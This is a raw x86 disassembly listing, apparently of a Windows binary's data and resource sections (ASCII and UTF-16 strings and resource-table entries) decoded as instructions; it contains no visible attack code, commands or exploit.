  4107a8:	add    BYTE PTR [edi+0x46],cl
  4107ab:	push   esi
  4107ac:	xor    al,0x34
  4107ae:	pop    edi
  4107af:	inc    edi
  4107b0:	inc    edi
  4107b1:	push   esp
  4107b2:	pop    edx
  4107b3:	inc    edx
  4107b4:	pop    edi
  4107b5:	push   ebp
  4107b6:	add    BYTE PTR [edi+0x41],al
  4107b9:	xor    al,0x39
  4107bb:	xor    BYTE PTR [edi+0x39],bl
  4107be:	inc    edx
  4107bf:	add    BYTE PTR [esi+0x36],cl
  4107c2:	xor    bl,BYTE PTR [edi+0x41]
  4107c5:	xor    ebx,DWORD PTR ss:[edi+0x38]
  4107c9:	xor    eax,DWORD PTR [ecx+0x52]
  4107cc:	push   ebx
  4107cd:	pop    edi
  4107ce:	inc    esi
  4107cf:	add    BYTE PTR [ecx+0x57],al
  4107d2:	push   ebp
  4107d3:	pop    edi
  4107d4:	inc    esi
  4107d5:	pop    edx
  4107d6:	push   ebp
  4107d7:	xor    dh,BYTE PTR [esi]
  4107d9:	add    BYTE PTR [edi+0x48],al
  4107dc:	xor    BYTE PTR [edi+0x33],bl
  4107df:	inc    ebp
  4107e0:	cmp    DWORD PTR [edi+0x5f],ecx
  4107e3:	push   ebx
  4107e4:	cmp    DWORD PTR [eax],eax
  4107e6:	push   esp
  4107e7:	xor    al,0x51
  4107e9:	cmp    BYTE PTR [esi],dh
  4107eb:	pop    edi
  4107ec:	push   esp
  4107ed:	dec    ecx
  4107ee:	dec    edi
  4107ef:	add    BYTE PTR [esp+ecx*2+0x5a],al
  4107f3:	pop    edi
  4107f4:	pop    edx
  4107f5:	dec    edx
  4107f6:	cmp    BYTE PTR [ebx+eax*2+0x5f],dl
  4107fa:	cmp    DWORD PTR [ecx],edi
  4107fc:	add    BYTE PTR [eax+0x4e],dl
  4107ff:	xor    al,0x5f
  410801:	dec    esi
  410802:	inc    esp
  410803:	xor    DWORD PTR [edi],esi
  410805:	pop    edi
  410806:	cmp    DWORD PTR [ecx+0x41],edx
  410809:	add    BYTE PTR [edx+0x54],cl
  41080c:	xor    bl,BYTE PTR [edi+0x50]
  41080f:	push   ebx
  410810:	push   esi
  410811:	inc    esp
  410812:	pop    edi
  410813:	push   edx
  410814:	xor    BYTE PTR [ecx+0x0],bl
  410817:	push   esi
  410818:	inc    esp
  410819:	push   esp
  41081a:	pop    edi
  41081b:	dec    esp
  41081c:	xor    al,0x33
  41081e:	cmp    DWORD PTR [eax+eax*1+0x59],edx
  410822:	inc    edi
  410823:	inc    ebp
  410824:	pop    edi
  410825:	push   ebp
  410826:	pop    edx
  410827:	push   eax
  410828:	dec    edi
  410829:	pop    edi
  41082a:	push   esi
  41082b:	xor    BYTE PTR [eax],al
  41082d:	pop    eax
  41082e:	push   edi
  41082f:	push   esi
  410830:	cmp    BYTE PTR [edi+0x47],bl
  410833:	dec    ecx
  410834:	push   esp
  410835:	push   edx
  410836:	dec    ebx
  410837:	xor    BYTE PTR [edi+0x0],cl
  41083a:	dec    ecx
  41083b:	dec    esi
  41083c:	xor    eax,0x33345f30
  410841:	push   eax
  410842:	dec    edx
  410843:	cmp    BYTE PTR [eax],al
  410845:	pop    eax
  410846:	inc    ecx
  410847:	dec    esi
  410848:	pop    edi
  410849:	inc    edx
  41084a:	push   ebp
  41084b:	push   ecx
  41084c:	pop    edi
  41084d:	inc    ecx
  41084e:	add    BYTE PTR [edi+0x58],al
  410851:	xor    BYTE PTR [edi+0x4c],bl
  410854:	dec    ebp
  410855:	cmp    DWORD PTR [ebp+0x5f],edx
  410858:	push   esp
  410859:	push   edx
  41085a:	add    BYTE PTR [eax+0x38],cl
  41085d:	dec    edi
  41085e:	xor    eax,0x594b535f
  410863:	xor    BYTE PTR [ebp+0x0],cl
  410866:	inc    ecx
  410867:	dec    eax
  410868:	xor    DWORD PTR [edi+0x4e],ebx
  41086b:	ss inc esp
  41086d:	dec    eax
  41086e:	cmp    DWORD PTR [eax],eax
  410870:	push   esi
  410871:	push   esp
  410872:	aaa    
  410873:	xor    bh,BYTE PTR [ecx]
  410875:	xor    al,0x31
  410877:	pop    edi
  410878:	push   edx
  410879:	push   edi
  41087a:	push   edx
  41087b:	dec    ecx
  41087c:	pop    edi
  41087d:	inc    esp
  41087e:	add    BYTE PTR [edi+0x52],dl
  410881:	pop    ecx
  410882:	xor    eax,0x5045395f
  410887:	pop    edi
  410888:	xor    eax,DWORD PTR [eax]
  41088a:	inc    ebp
  41088b:	xor    dl,BYTE PTR [ebx+0x39]
  41088e:	xor    dh,BYTE PTR [esi]
  410890:	xor    eax,0x4900525f
  410895:	push   esp
  410896:	xor    bl,BYTE PTR [edi+0x41]
  410899:	dec    edx
  41089a:	xor    eax,0x4c3737
  41089f:	push   ecx
  4108a0:	add    BYTE PTR [edi+0x0],al
  4108a3:	pop    ecx
  4108a4:	add    BYTE PTR [edi+0x0],bl
  4108a7:	push   ebx
  4108a8:	add    BYTE PTR [ebx+0x0],al
  4108ab:	xor    al,BYTE PTR [eax]
  4108ad:	pop    edx
  4108ae:	add    BYTE PTR [edi+0x0],dl
  4108b1:	add    BYTE PTR [eax],al
  4108b3:	push   edx
  4108b4:	add    BYTE PTR [eax+eax*1+0x4d],dl
  4108b8:	add    BYTE PTR [edi+0x0],bl
  4108bb:	dec    eax
  4108bc:	add    BYTE PTR [ebx+0x0],cl
  4108bf:	xor    DWORD PTR [eax],eax
  4108c1:	pop    edi
  4108c2:	add    BYTE PTR [ecx+0x0],al
  4108c5:	push   ebp
  4108c6:	add    BYTE PTR [ecx],bh
  4108c8:	add    BYTE PTR [esi+0x0],dl
  4108cb:	xor    al,BYTE PTR [eax]
  4108cd:	pop    edi
  4108ce:	add    BYTE PTR [edx],dh
  4108d0:	add    BYTE PTR [eax],al
  4108d2:	add    BYTE PTR [ecx+0x0],dl
  4108d5:	xor    al,0x0
  4108d7:	inc    edx
  4108d8:	add    BYTE PTR [edi+0x0],bl
  4108db:	inc    esp
  4108dc:	add    BYTE PTR [esi+0x0],dl
  4108df:	xor    eax,0x5f005500
  4108e4:	add    BYTE PTR [ebx+0x0],al
  4108e7:	inc    ebx
  4108e8:	add    BYTE PTR [eax],al
  4108ea:	add    BYTE PTR [eax+0x0],cl
  4108ed:	inc    edx
  4108ee:	add    BYTE PTR [ecx+0x0],dl
  4108f1:	pop    edi
  4108f2:	add    BYTE PTR [eax+eax*1+0x38],dl
  4108f6:	add    BYTE PTR [eax+0x0],dl
  4108f9:	push   edx
  4108fa:	add    BYTE PTR [ecx+0x0],cl
  4108fd:	pop    edi
  4108fe:	add    BYTE PTR [ebp+0x0],al
  410901:	dec    ebp
  410902:	add    BYTE PTR [ebp+0x0],dl
  410905:	add    BYTE PTR [eax],al
  410907:	inc    edi
  410908:	add    BYTE PTR [edi+0x0],cl
  41090b:	xor    eax,0x32005f00
  410910:	add    BYTE PTR [ebx+0x0],dl
  410913:	inc    ebp
  410914:	add    BYTE PTR [ecx],bh
  410916:	add    BYTE PTR [esi],dh
  410918:	add    BYTE PTR [edi+0x0],bl
  41091b:	pop    eax
  41091c:	add    BYTE PTR [edx+0x0],bl
  41091f:	xor    al,0x0
  410921:	pop    edi
  410922:	add    BYTE PTR [edi+0x0],cl
  410925:	add    BYTE PTR [eax],al
  410927:	push   ebx
  410928:	add    BYTE PTR [eax],dh
  41092a:	add    BYTE PTR [ecx+0x0],dl
  41092d:	pop    edi
  41092e:	add    BYTE PTR [ebp+0x0],dl
  410931:	dec    ecx
  410932:	add    BYTE PTR [ecx+0x0],bl
  410935:	xor    al,BYTE PTR [eax]
  410937:	add    BYTE PTR [eax],al
  410939:	dec    eax
  41093a:	add    BYTE PTR [edi],dh
  41093c:	add    BYTE PTR [ecx+0x0],bl
  41093f:	aaa    
  410940:	add    BYTE PTR [edi+0x0],bl
  410943:	inc    esi
  410944:	add    BYTE PTR [edi],dh
  410946:	add    BYTE PTR [ecx+0x0],bl
  410949:	inc    esp
  41094a:	add    BYTE PTR [edi+0x0],bl
  41094d:	xor    eax,0x52000000
  410952:	add    BYTE PTR [eax+0x0],dl
  410955:	inc    esi
  410956:	add    BYTE PTR [edi+0x0],bl
  410959:	dec    esp
  41095a:	add    BYTE PTR [ecx+0x0],al
  41095d:	push   eax
  41095e:	add    BYTE PTR [edi+0x0],bl
  410961:	inc    ecx
  410962:	add    BYTE PTR [edi],dh
  410964:	add    BYTE PTR [eax+eax*1+0x4a],al
  410968:	add    BYTE PTR [ebp+0x0],al
  41096b:	pop    edi
  41096c:	add    BYTE PTR [eax+eax*1],dh
  41096f:	add    BYTE PTR [eax],al
  410971:	dec    esp
  410972:	add    BYTE PTR [edi],dh
  410974:	add    BYTE PTR [ebp+0x0],cl
  410977:	cmp    BYTE PTR [eax],al
  410979:	xor    al,BYTE PTR [eax]
  41097b:	pop    edi
  41097c:	add    BYTE PTR [eax],bh
  41097e:	add    BYTE PTR [ecx+0x0],al
  410981:	pop    edx
  410982:	add    BYTE PTR [edx+0x0],bl
  410985:	pop    edi
  410986:	add    BYTE PTR [ebx],dh
  410988:	add    BYTE PTR [ebx+0x0],dl
  41098b:	add    BYTE PTR [eax],al
  41098d:	push   esi
  41098e:	add    BYTE PTR [eax],bh
  410990:	add    BYTE PTR [esi+0x0],dl
  410993:	xor    al,BYTE PTR [eax]
  410995:	pop    edi
  410996:	add    BYTE PTR [esi+0x0],al
  410999:	inc    ebx
  41099a:	add    BYTE PTR [edi+0x0],al
  41099d:	push   edi
  41099e:	add    BYTE PTR [edi+0x0],bl
  4109a1:	dec    eax
  4109a2:	add    BYTE PTR [edx+0x0],cl
  4109a5:	cmp    DWORD PTR [eax],eax
  4109a7:	aaa    
  4109a8:	add    BYTE PTR [eax],al
  4109aa:	add    BYTE PTR [ecx+0x0],cl
  4109ad:	dec    edx
  4109ae:	add    BYTE PTR [ecx+0x0],al
  4109b1:	pop    edi
  4109b2:	add    BYTE PTR [edx+0x0],cl
  4109b5:	inc    esi
  4109b6:	add    BYTE PTR [edi+0x0],dl
  4109b9:	xor    eax,DWORD PTR [eax]
  4109bb:	dec    ebp
  4109bc:	add    BYTE PTR [edi+0x0],bl
  4109bf:	push   eax
  4109c0:	add    BYTE PTR [ecx+0x0],al
  4109c3:	add    BYTE PTR [eax],al
  4109c5:	dec    edi
  4109c6:	add    BYTE PTR [ecx+0x0],bl
  4109c9:	dec    eax
  4109ca:	add    BYTE PTR [edi+0x0],bl
  4109cd:	xor    eax,0x0
	...
  4109da:	add    al,0x0
  4109dc:	add    BYTE PTR [eax],al
  4109de:	push   cs
  4109df:	add    BYTE PTR [eax],al
  4109e1:	add    BYTE PTR [eax],al
  4109e3:	pop    es
  4109e4:	add    BYTE PTR [eax-0x7fffff80],al
  4109ea:	cs pop es
  4109ec:	add    BYTE PTR [eax-0x7fffff68],al
  4109f2:	test   al,0x7
  4109f4:	add    BYTE PTR [eax-0x7fffff30],al
  4109fa:	rol    BYTE PTR [edi],cl
  4109fc:	add    BYTE PTR [eax-0x7fffff18],al
  410a02:	add    al,0x8
  410a04:	add    BYTE PTR [eax-0x7ffffef0],al
  410a0a:	xor    BYTE PTR [eax],cl
  410a0c:	add    BYTE PTR [eax-0x7ffffed8],al
  410a12:	pusha  
  410a13:	or     BYTE PTR [eax],al
  410a15:	adc    BYTE PTR [eax+0x1],0x0
  410a19:	cmp    BYTE PTR [edx+0x8],0x0
  410a1d:	sub    BYTE PTR [eax+0x1],0x0
  410a21:	adc    dh,0x8
  410a24:	add    BYTE PTR [eax-0x7ffffe60],al
  410a2a:	call   0xb8c10a37
  410a2f:	add    DWORD PTR [eax],eax
  410a31:	sbb    BYTE PTR [eax],0x9
  410a34:	add    BYTE PTR [eax-0x7ffffe28],al
  410a3a:	dec    eax
  410a3b:	or     DWORD PTR [eax],eax
  410a3d:	add    BYTE PTR [eax],0x2
  410a40:	add    BYTE PTR [eax-0x7ffff67e],al
  410a46:	sbb    BYTE PTR [edx],al
  410a48:	add    BYTE PTR [eax-0x7ffff64e],al
  410a4e:	cmp    BYTE PTR [edx],al
  410a50:	add    BYTE PTR [eax+0x0],al
  410a56:	add    BYTE PTR [eax],al
  410a58:	add    BYTE PTR [eax],al
  410a5a:	add    al,0x0
  410a5c:	add    BYTE PTR [eax],al
  410a5e:	add    DWORD PTR [eax],eax
  410a60:	add    BYTE PTR [eax],al
  410a62:	sbb    al,0x7
  410a64:	add    BYTE PTR [eax-0x7ffffdb0],al
	...
  410a72:	add    al,0x0
  410a74:	add    BYTE PTR [eax],al
  410a76:	add    al,0x0
  410a78:	add    DWORD PTR [eax],eax
  410a7a:	dec    esi
  410a7b:	pop    es
  410a7c:	add    BYTE PTR [eax-0x7ffffd98],al
  410a82:	bound  eax,QWORD PTR [edi]
  410a84:	add    BYTE PTR [eax-0x7ffffd80],al
  410a8a:	jp     0x410a93
  410a8c:	add    BYTE PTR [eax-0x7ffffd68],al
  410a92:	mov    es,WORD PTR [edi]
  410a94:	add    BYTE PTR [eax-0x7ffffd50],al
  410a9a:	and    DWORD PTR [edx+0x0],0x0
  410a9e:	enter  0x2,0x80
	...
  410aaa:	add    al,0x0
  410aac:	add    BYTE PTR [eax],al
  410aae:	add    DWORD PTR [eax],eax
  410ab0:	add    BYTE PTR [eax],al
  410ab2:	mov    edx,0xe0800007
  410ab7:	add    al,BYTE PTR [eax]
  410ab9:	add    BYTE PTR [eax],0x0
  410abc:	add    BYTE PTR [eax],al
  410abe:	add    BYTE PTR [eax],al
  410ac0:	add    BYTE PTR [eax],al
  410ac2:	add    al,0x0
  410ac4:	add    BYTE PTR [eax],al
  410ac6:	add    DWORD PTR [eax],eax
  410ac8:	add    al,BYTE PTR [eax]
  410aca:	repnz pop es
  410acc:	add    BYTE PTR [eax-0x7ffffd08],al
  410ad2:	fstp   QWORD PTR [esi]
  410ad4:	add    BYTE PTR [eax],al
  410ad6:	adc    BYTE PTR [ebx],al
  410ad8:	add    BYTE PTR [eax+0x2c95],al
  410ade:	sub    BYTE PTR [ebx],al
  410ae0:	add    BYTE PTR [eax+0x0],al
  410ae6:	add    BYTE PTR [eax],al
  410ae8:	add    BYTE PTR [eax],al
  410aea:	add    al,0x0
  410aec:	add    BYTE PTR [eax],al
  410aee:	add    DWORD PTR [eax],eax
  410af0:	add    BYTE PTR [eax],al
  410af2:	push   ds
  410af3:	or     BYTE PTR [eax],al
  410af5:	add    BYTE PTR [eax+0x3],0x0
  410af9:	add    BYTE PTR [eax],0x0
  410afc:	add    BYTE PTR [eax],al
  410afe:	add    BYTE PTR [eax],al
  410b00:	add    BYTE PTR [eax],al
  410b02:	add    al,0x0
  410b04:	add    BYTE PTR [eax],al
  410b06:	add    DWORD PTR [eax],eax
  410b08:	add    al,BYTE PTR [eax]
  410b0a:	dec    esi
  410b0b:	or     BYTE PTR [eax],al
  410b0d:	sbb    BYTE PTR [eax+0x3],0x0
  410b11:	sub    BYTE PTR [ecx+edx*1+0x0],0x0
  410b16:	jo     0x410b1b
  410b18:	add    BYTE PTR [eax+0x24ad],al
  410b1e:	mov    BYTE PTR [ebx],al
  410b20:	add    BYTE PTR [eax+0x0],al
  410b26:	add    BYTE PTR [eax],al
  410b28:	add    BYTE PTR [eax],al
  410b2a:	add    al,0x0
  410b2c:	add    BYTE PTR [eax],al
  410b2e:	add    BYTE PTR [eax],al
  410b30:	add    DWORD PTR [eax],eax
  410b32:	jg     0x410b43
  410b34:	add    BYTE PTR [eax],al
  410b36:	mov    al,ds:0x800003
  410b3b:	add    BYTE PTR [eax],al
  410b3d:	add    BYTE PTR [eax],al
  410b3f:	add    BYTE PTR [eax],al
  410b41:	add    BYTE PTR [eax+eax*1],al
  410b44:	add    BYTE PTR [eax],al
  410b46:	add    eax,DWORD PTR [eax]
  410b48:	add    al,BYTE PTR [eax]
  410b4a:	nop
  410b4b:	or     BYTE PTR [eax],al
  410b4d:	cmp    BYTE PTR [eax-0x537ffffd],0x8
  410b54:	add    BYTE PTR [eax-0x7ffffc30],al
  410b5a:	mov    esi,0xe8800008
  410b5f:	add    eax,DWORD PTR [eax]
  410b61:	xor    bh,0x3
  410b64:	add    BYTE PTR [eax],al
  410b66:	add    BYTE PTR [eax+eax*1],al
  410b69:	or     BYTE PTR [esi+0x18000018],0x4
  410b70:	add    BYTE PTR [eax+0x0],al
  410b76:	add    BYTE PTR [eax],al
  410b78:	add    BYTE PTR [eax],al
  410b7a:	add    al,0x0
  410b7c:	add    BYTE PTR [eax],al
  410b7e:	add    BYTE PTR [eax],al
  410b80:	add    DWORD PTR [eax],eax
  410b82:	mov    esp,0x30000047
  410b87:	add    al,0x0
  410b89:	add    BYTE PTR [eax],0x0
  410b8c:	add    BYTE PTR [eax],al
  410b8e:	add    BYTE PTR [eax],al
  410b90:	add    BYTE PTR [eax],al
  410b92:	add    al,0x0
  410b94:	add    BYTE PTR [eax],al
  410b96:	add    DWORD PTR [eax],eax
  410b98:	add    DWORD PTR [eax],eax
  410b9a:	add    cl,BYTE PTR [ecx]
  410b9c:	add    BYTE PTR [eax-0x7ffffbb8],al
  410ba2:	shr    BYTE PTR [edi+0x0],cl
  410ba5:	add    BYTE PTR [eax+0x4],ah
  410ba8:	add    BYTE PTR [eax+0x0],al
  410bae:	add    BYTE PTR [eax],al
  410bb0:	add    BYTE PTR [eax],al
  410bb2:	add    al,0x0
  410bb4:	add    BYTE PTR [eax],al
  410bb6:	add    DWORD PTR [eax],eax
  410bb8:	add    al,BYTE PTR [eax]
  410bba:	xor    al,0x9
  410bbc:	add    BYTE PTR [eax-0x7ffffb88],al
  410bc2:	mov    ds:0x90000012,eax
  410bc7:	add    al,0x0
  410bc9:	and    BYTE PTR [edx],0x7b
  410bcc:	add    BYTE PTR [eax],al
  410bce:	test   al,0x4
  410bd0:	add    BYTE PTR [eax+0x0],al
  410bd6:	add    BYTE PTR [eax],al
  410bd8:	add    BYTE PTR [eax],al
  410bda:	add    al,0x0
  410bdc:	add    BYTE PTR [eax],al
  410bde:	add    DWORD PTR [eax],eax
  410be0:	add    BYTE PTR [eax],al
  410be2:	or     DWORD PTR fs:[eax],eax
  410be5:	add    al,0x4
  410be8:	add    BYTE PTR [eax+0x0],al
  410bee:	add    BYTE PTR [eax],al
  410bf0:	add    BYTE PTR [eax],al
  410bf2:	add    al,0x0
  410bf4:	add    BYTE PTR [eax],al
  410bf6:	add    DWORD PTR [eax],eax
  410bf8:	add    DWORD PTR [eax],eax
  410bfa:	xchg   esp,eax
  410bfb:	or     DWORD PTR [eax],eax
  410bfd:	sbb    al,0x4
  410c00:	add    BYTE PTR [eax+0x7254],al
  410c06:	lock add al,0x0
  410c09:	add    BYTE PTR [eax],0x0
  410c0c:	add    BYTE PTR [eax],al
  410c0e:	add    BYTE PTR [eax],al
  410c10:	add    BYTE PTR [eax],al
  410c12:	add    al,0x0
  410c14:	add    BYTE PTR [eax],al
  410c16:	add    DWORD PTR [eax],eax
  410c18:	add    BYTE PTR [eax],al
  410c1a:	int3   
  410c1b:	or     DWORD PTR [eax],eax
  410c1d:	or     BYTE PTR [eax],0x5
  410c20:	add    BYTE PTR [eax+0x0],al
  410c26:	add    BYTE PTR [eax],al
  410c28:	add    BYTE PTR [eax],al
  410c2a:	add    al,0x0
  410c2c:	add    BYTE PTR [eax],al
  410c2e:	add    BYTE PTR [eax],al
  410c30:	add    DWORD PTR [eax],eax
  410c32:	or     DWORD PTR [eax+eax*1],eax
  410c35:	add    BYTE PTR [eax],ah
  410c37:	add    eax,0x0
  410c3c:	add    BYTE PTR [eax],al
  410c3e:	add    BYTE PTR [eax],al
  410c40:	add    BYTE PTR [eax],al
  410c42:	add    al,0x0
  410c44:	add    BYTE PTR [eax],al
  410c46:	add    BYTE PTR [eax],al
  410c48:	add    DWORD PTR [eax],eax
  410c4a:	or     DWORD PTR [eax+eax*1],eax
  410c4d:	add    BYTE PTR [eax],dh
  410c4f:	add    eax,0x0
  410c54:	add    BYTE PTR [eax],al
  410c56:	add    BYTE PTR [eax],al
  410c58:	add    BYTE PTR [eax],al
  410c5a:	add    al,0x0
  410c5c:	add    BYTE PTR [eax],al
  410c5e:	add    BYTE PTR [eax],al
  410c60:	add    DWORD PTR [eax],eax
  410c62:	or     DWORD PTR [eax+eax*1],eax
  410c65:	add    BYTE PTR [eax+0x5],al
	...
  410c70:	add    BYTE PTR [eax],al
  410c72:	add    al,0x0
  410c74:	add    BYTE PTR [eax],al
  410c76:	add    BYTE PTR [eax],al
  410c78:	add    DWORD PTR [eax],eax
  410c7a:	or     DWORD PTR [eax+eax*1],eax
  410c7d:	add    BYTE PTR [eax+0x5],dl
	...
  410c88:	add    BYTE PTR [eax],al
  410c8a:	add    al,0x0
  410c8c:	add    BYTE PTR [eax],al
  410c8e:	add    BYTE PTR [eax],al
  410c90:	add    DWORD PTR [eax],eax
  410c92:	or     DWORD PTR [eax+eax*1],eax
  410c95:	add    BYTE PTR [eax+0x5],ah
	...
  410ca0:	add    BYTE PTR [eax],al
  410ca2:	add    al,0x0
  410ca4:	add    BYTE PTR [eax],al
  410ca6:	add    BYTE PTR [eax],al
  410ca8:	add    DWORD PTR [eax],eax
  410caa:	or     DWORD PTR [eax+eax*1],eax
  410cad:	add    BYTE PTR [eax+0x5],dh
	...
  410cb8:	add    BYTE PTR [eax],al
  410cba:	add    al,0x0
  410cbc:	add    BYTE PTR [eax],al
  410cbe:	add    BYTE PTR [eax],al
  410cc0:	add    DWORD PTR [eax],eax
  410cc2:	or     DWORD PTR [eax+eax*1],eax
  410cc5:	add    BYTE PTR [eax+0x5],al
  410ccb:	add    BYTE PTR [eax],al
  410ccd:	add    BYTE PTR [eax],al
  410ccf:	add    BYTE PTR [eax],al
  410cd1:	add    BYTE PTR [eax+eax*1],al
  410cd4:	add    BYTE PTR [eax],al
  410cd6:	add    BYTE PTR [eax],al
  410cd8:	add    DWORD PTR [eax],eax
  410cda:	or     DWORD PTR [eax+eax*1],eax
  410cdd:	add    BYTE PTR [eax+0x5],dl
  410ce3:	add    BYTE PTR [eax],al
  410ce5:	add    BYTE PTR [eax],al
  410ce7:	add    BYTE PTR [eax],al
  410ce9:	add    BYTE PTR [eax+eax*1],al
  410cec:	add    BYTE PTR [eax],al
  410cee:	add    BYTE PTR [eax],al
  410cf0:	add    DWORD PTR [eax],eax
  410cf2:	or     DWORD PTR [eax+eax*1],eax
  410cf5:	add    BYTE PTR [eax+0x5],ah
  410cfb:	add    BYTE PTR [eax],al
  410cfd:	add    BYTE PTR [eax],al
  410cff:	add    BYTE PTR [eax],al
  410d01:	add    BYTE PTR [eax+eax*1],al
  410d04:	add    BYTE PTR [eax],al
  410d06:	add    BYTE PTR [eax],al
  410d08:	add    DWORD PTR [eax],eax
  410d0a:	or     DWORD PTR [eax+eax*1],eax
  410d0d:	add    BYTE PTR [eax+0x5],dh
  410d13:	add    BYTE PTR [eax],al
  410d15:	add    BYTE PTR [eax],al
  410d17:	add    BYTE PTR [eax],al
  410d19:	add    BYTE PTR [eax+eax*1],al
  410d1c:	add    BYTE PTR [eax],al
  410d1e:	add    BYTE PTR [eax],al
  410d20:	add    DWORD PTR [eax],eax
  410d22:	or     DWORD PTR [eax+eax*1],eax
  410d25:	add    al,al
  410d27:	add    eax,0x0
  410d2c:	add    BYTE PTR [eax],al
  410d2e:	add    BYTE PTR [eax],al
  410d30:	add    BYTE PTR [eax],al
  410d32:	add    al,0x0
  410d34:	add    BYTE PTR [eax],al
  410d36:	add    BYTE PTR [eax],al
  410d38:	add    DWORD PTR [eax],eax
  410d3a:	or     DWORD PTR [eax+eax*1],eax
  410d3d:	add    al,dl
  410d3f:	add    eax,0x0
  410d44:	add    BYTE PTR [eax],al
  410d46:	add    BYTE PTR [eax],al
  410d48:	add    BYTE PTR [eax],al
  410d4a:	add    al,0x0
  410d4c:	add    BYTE PTR [eax],al
  410d4e:	add    BYTE PTR [eax],al
  410d50:	add    DWORD PTR [eax],eax
  410d52:	or     DWORD PTR [eax+eax*1],eax
  410d55:	add    al,ah
  410d57:	add    eax,0x0
  410d5c:	add    BYTE PTR [eax],al
  410d5e:	add    BYTE PTR [eax],al
  410d60:	add    BYTE PTR [eax],al
  410d62:	add    al,0x0
  410d64:	add    BYTE PTR [eax],al
  410d66:	add    BYTE PTR [eax],al
  410d68:	add    DWORD PTR [eax],eax
  410d6a:	or     DWORD PTR [eax+eax*1],eax
  410d6d:	add    al,dh
  410d6f:	add    eax,0x0
  410d74:	add    BYTE PTR [eax],al
  410d76:	add    BYTE PTR [eax],al
  410d78:	add    BYTE PTR [eax],al
  410d7a:	add    al,0x0
  410d7c:	add    BYTE PTR [eax],al
  410d7e:	add    BYTE PTR [eax],al
  410d80:	add    DWORD PTR [eax],eax
  410d82:	or     DWORD PTR [eax+eax*1],eax
  410d85:	add    BYTE PTR [eax],al
  410d87:	push   es
	...
  410d90:	add    BYTE PTR [eax],al
  410d92:	add    al,0x0
  410d94:	add    BYTE PTR [eax],al
  410d96:	add    BYTE PTR [eax],al
  410d98:	add    DWORD PTR [eax],eax
  410d9a:	or     DWORD PTR [eax+eax*1],eax
  410d9d:	add    BYTE PTR [eax],dl
  410d9f:	push   es
	...
  410da8:	add    BYTE PTR [eax],al
  410daa:	add    al,0x0
  410dac:	add    BYTE PTR [eax],al
  410dae:	add    BYTE PTR [eax],al
  410db0:	add    DWORD PTR [eax],eax
  410db2:	or     DWORD PTR [eax+eax*1],eax
  410db5:	add    BYTE PTR [eax],ah
  410db7:	push   es
	...
  410dc0:	add    BYTE PTR [eax],al
  410dc2:	add    al,0x0
  410dc4:	add    BYTE PTR [eax],al
  410dc6:	add    BYTE PTR [eax],al
  410dc8:	add    DWORD PTR [eax],eax
  410dca:	or     DWORD PTR [eax+eax*1],eax
  410dcd:	add    BYTE PTR [eax],dh
  410dcf:	push   es
	...
  410dd8:	add    BYTE PTR [eax],al
  410dda:	add    al,0x0
  410ddc:	add    BYTE PTR [eax],al
  410dde:	add    BYTE PTR [eax],al
  410de0:	add    DWORD PTR [eax],eax
  410de2:	or     DWORD PTR [eax+eax*1],eax
  410de5:	add    BYTE PTR [eax+0x6],al
	...
  410df0:	add    BYTE PTR [eax],al
  410df2:	add    al,0x0
  410df4:	add    BYTE PTR [eax],al
  410df6:	add    BYTE PTR [eax],al
  410df8:	add    DWORD PTR [eax],eax
  410dfa:	or     DWORD PTR [eax+eax*1],eax
  410dfd:	add    BYTE PTR [eax+0x6],dl
	...
  410e08:	add    BYTE PTR [eax],al
  410e0a:	add    al,0x0
  410e0c:	add    BYTE PTR [eax],al
  410e0e:	add    BYTE PTR [eax],al
  410e10:	add    DWORD PTR [eax],eax
  410e12:	or     DWORD PTR [eax+eax*1],eax
  410e15:	add    BYTE PTR [eax+0x6],ah
	...
  410e20:	add    BYTE PTR [eax],al
  410e22:	add    al,0x0
  410e24:	add    BYTE PTR [eax],al
  410e26:	add    BYTE PTR [eax],al
  410e28:	add    DWORD PTR [eax],eax
  410e2a:	or     DWORD PTR [eax+eax*1],eax
  410e2d:	add    BYTE PTR [eax+0x6],dh
	...
  410e38:	add    BYTE PTR [eax],al
  410e3a:	add    al,0x0
  410e3c:	add    BYTE PTR [eax],al
  410e3e:	add    BYTE PTR [eax],al
  410e40:	add    DWORD PTR [eax],eax
  410e42:	or     DWORD PTR [eax+eax*1],eax
  410e45:	add    BYTE PTR [eax+0x6],al
  410e4b:	add    BYTE PTR [eax],al
  410e4d:	add    BYTE PTR [eax],al
  410e4f:	add    BYTE PTR [eax],al
  410e51:	add    BYTE PTR [eax+eax*1],al
  410e54:	add    BYTE PTR [eax],al
  410e56:	add    BYTE PTR [eax],al
  410e58:	add    DWORD PTR [eax],eax
  410e5a:	or     DWORD PTR [eax+eax*1],eax
  410e5d:	add    BYTE PTR [eax+0x6],dl
  410e63:	add    BYTE PTR [eax],al
  410e65:	add    BYTE PTR [eax],al
  410e67:	add    BYTE PTR [eax],al
  410e69:	add    BYTE PTR [eax+eax*1],al
  410e6c:	add    BYTE PTR [eax],al
  410e6e:	add    BYTE PTR [eax],al
  410e70:	add    DWORD PTR [eax],eax
  410e72:	or     DWORD PTR [eax+eax*1],eax
  410e75:	add    BYTE PTR [eax+0x6],ah
  410e7b:	add    BYTE PTR [eax],al
  410e7d:	add    BYTE PTR [eax],al
  410e7f:	add    BYTE PTR [eax],al
  410e81:	add    BYTE PTR [eax+eax*1],al
  410e84:	add    BYTE PTR [eax],al
  410e86:	add    BYTE PTR [eax],al
  410e88:	add    DWORD PTR [eax],eax
  410e8a:	or     DWORD PTR [eax+eax*1],eax
  410e8d:	add    BYTE PTR [eax+0x6],dh
  410e93:	add    BYTE PTR [eax],al
  410e95:	add    BYTE PTR [eax],al
  410e97:	add    BYTE PTR [eax],al
  410e99:	add    BYTE PTR [eax+eax*1],al
  410e9c:	add    BYTE PTR [eax],al
  410e9e:	add    BYTE PTR [eax],al
  410ea0:	add    DWORD PTR [eax],eax
  410ea2:	or     DWORD PTR [eax+eax*1],eax
  410ea5:	add    al,al
  410ea7:	push   es
	...
  410eb0:	add    BYTE PTR [eax],al
  410eb2:	add    al,0x0
  410eb4:	add    BYTE PTR [eax],al
  410eb6:	add    BYTE PTR [eax],al
  410eb8:	add    DWORD PTR [eax],eax
  410eba:	or     DWORD PTR [eax+eax*1],eax
  410ebd:	add    al,dl
  410ebf:	push   es
	...
  410ec8:	add    BYTE PTR [eax],al
  410eca:	add    al,0x0
  410ecc:	add    BYTE PTR [eax],al
  410ece:	add    BYTE PTR [eax],al
  410ed0:	add    DWORD PTR [eax],eax
  410ed2:	or     DWORD PTR [eax+eax*1],eax
  410ed5:	add    al,ah
  410ed7:	push   es
	...
  410ee0:	add    BYTE PTR [eax],al
  410ee2:	add    al,0x0
